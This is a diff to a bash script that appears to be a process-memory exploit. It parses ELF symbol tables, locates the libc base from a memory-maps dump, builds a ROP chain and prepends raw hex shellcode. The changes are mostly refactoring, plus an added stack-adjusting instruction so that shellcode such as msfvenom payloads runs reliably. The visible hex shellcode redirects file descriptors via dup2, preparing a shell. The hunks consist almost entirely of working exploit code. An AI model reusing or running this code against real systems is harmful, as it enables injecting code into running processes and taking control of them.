@@ -125,11 +125,11 @@ search_symbol()
 
     local symtab_off=$(search_section file $1 .dynsym)
     local symtab_size=$(echo $symtab_off | cut -d' ' -f2)
-    local symtab_size_ent=$(echo $symtab_off | cut -d' ' -f4)
+    local symtabentsize=$(echo $symtab_off | cut -d' ' -f4)
     symtab_off=$(echo $symtab_off | cut -d' ' -f1)
     local symtab=$(od -v -t x1 $1 -N $symtab_size -j $symtab_off| head -n-1 |\
     cut -d' ' -f2- | tr -d ' \n')
-    local symtab_ent_num=$((symtab_size / symtab_size_ent))
+    local symtab_ent_num=$((symtab_size / symtabentsize))
 
     local name1=$(echo -n $2 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
     tr -d ' \n')00
@@ -151,7 +151,7 @@ search_symbol()
     local symbol2_off=""
     for i in $(seq $((symtab_ent_num - 1)))
     do
-        local symtabent=${symtab:$((i * symtab_size_ent * 2)):$((symtab_size_ent * 2))}
+        local symtabent=${symtab:$((i*symtabentsize*2)):$((symtabentsize*2))}
         local symbol_name_idx=$((0x$(endian ${symtabent:0:8})))
         local symbol_name=${strtab:$symbol_name_idx * 2:$len}
         if [ $symbol_name = $name1 ]
@@ -197,7 +197,8 @@ find_gadget()
 craft_rop()
 {
     # Where is located the libc without ASLR in this system
-    local libc_base=$(echo "$dd_maps" | grep $libc_path | head -n1 | cut -d'-' -f1)
+    local libc_base=$(echo "$dd_maps" | grep $libc_path | head -n1 |\
+                      cut -d'-' -f1)
     libc_base=$((0x$libc_base))
 
     local text=$(read_text $filename)
@@ -283,6 +284,11 @@ else
 fi
 # dup2(2, 1); dup2(2, 0);
 sc="4831c0b0024889c7b0014889c6b0210f054831c04889c6b0024889c7b0210f05"$sc
+# A shellcode may rely on having some space above in the stack. Our ROP leaves
+# the rsp pointing exactly to the last address of the stack. So let's decrease
+# this register and give some space to breath for these dumb shellcodes
+# (looking at you... msfvenom).
+sc="4881ec00010000"$sc
 sc_len=$((${#sc} / 2))
 sc_len=$(printf %016x $sc_len)
 
